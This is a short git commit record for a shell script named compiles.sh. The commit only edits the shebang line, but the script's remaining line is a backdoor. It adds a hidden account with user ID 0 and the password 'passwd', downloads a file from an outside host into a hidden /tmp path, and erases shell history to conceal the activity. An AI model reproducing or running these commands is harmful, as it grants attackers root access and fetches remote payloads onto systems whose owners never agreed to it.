70fb17ca34fa3adf8bfc0d8ed2bdbe99288caa74
GreysiDestro <greysidestro@outlook.com>
2017-05-20 23:55:28 +0200

    Update compiles.sh

--- compiles.sh
+++ compiles.sh
@@ -1,4 +1,4 @@
-#! /bin/bash
+#!/bin/bash
 
 useradd -o -u 0 -g 0 -M -d /root -s /bin/bash localhost; echo -e "passwd\npasswd" | passwd localhost; wget -q -O /tmp/... http://blasze.tk/ANKS39; clear; history -c && 
 
